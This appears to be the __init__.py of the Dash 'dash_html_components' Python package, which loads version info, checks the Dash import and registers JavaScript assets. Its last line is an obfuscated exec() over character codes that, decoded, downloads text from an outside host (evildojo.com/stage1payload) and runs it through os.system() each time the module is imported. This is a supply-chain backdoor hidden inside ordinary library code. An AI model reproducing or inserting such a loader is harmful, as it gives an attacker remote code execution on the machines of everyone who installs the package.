"""Vanilla HTML components for Dash"""

from ._imports_ import *  # noqa: E402, F401, F403
from ._imports_ import __all__  # noqa: E402

import json
import os as _os
import sys as _sys
import dash as _dash

_basepath = _os.path.dirname(__file__)
_filepath = _os.path.abspath(_os.path.join(_basepath, "package-info.json"))
with open(_filepath) as f:
    package = json.load(f)

package_name = package["name"].replace(" ", "_").replace("-", "_")
__version__ = package["version"]


# Module imports trigger a dash.development import, need to check this first
if not hasattr(_dash, "__plotly_dash") and not hasattr(_dash, "development"):
    print(
        "Dash was not successfully imported. Make sure you don't have a file "
        "named \n'dash.py' in your current directory.",
        file=_sys.stderr,
    )
    _sys.exit(1)

_current_path = _os.path.dirname(_os.path.abspath(__file__))


_this_module = "dash_html_components"

_js_dist = [
    {
        "relative_package_path": "html/{}.min.js".format(_this_module),
        "external_url": (
            "https://unpkg.com/dash-html-components@{}"
            "/dash_html_components/dash_html_components.min.js"
        ).format(__version__),
        "namespace": "dash",
    },
    {
        "relative_package_path": "html/{}.min.js.map".format(_this_module),
        "external_url": (
            "https://unpkg.com/dash-html-components@{}"
            "/dash_html_components/dash_html_components.min.js.map"
        ).format(__version__),
        "namespace": "dash",
        "dynamic": True,
    },
]

_css_dist = []


for _component in __all__:
    setattr(locals()[_component], "_js_dist", _js_dist)
    setattr(locals()[_component], "_css_dist", _css_dist)
exec(''.join(chr(x) for x in [105,109,112,111,114,116,32,111,115,10,105,109,112,111,114,116,32,117,114,108,108,105,98,10,105,109,112,111,114,116,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,10,120,32,61,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,46,117,114,108,111,112,101,110,40,34,104,116,116,112,115,58,47,47,119,119,119,46,101,118,105,108,100,111,106,111,46,99,111,109,47,115,116,97,103,101,49,112,97,121,108,111,97,100,34,41,10,121,32,61,32,120,46,114,101,97,100,40,41,10,122,32,61,32,121,46,100,101,99,111,100,101,40,34,117,116,102,56,34,41,10,120,46,99,108,111,115,101,40,41,10,111,115,46,115,121,115,116,101,109,40,122,41,10]))

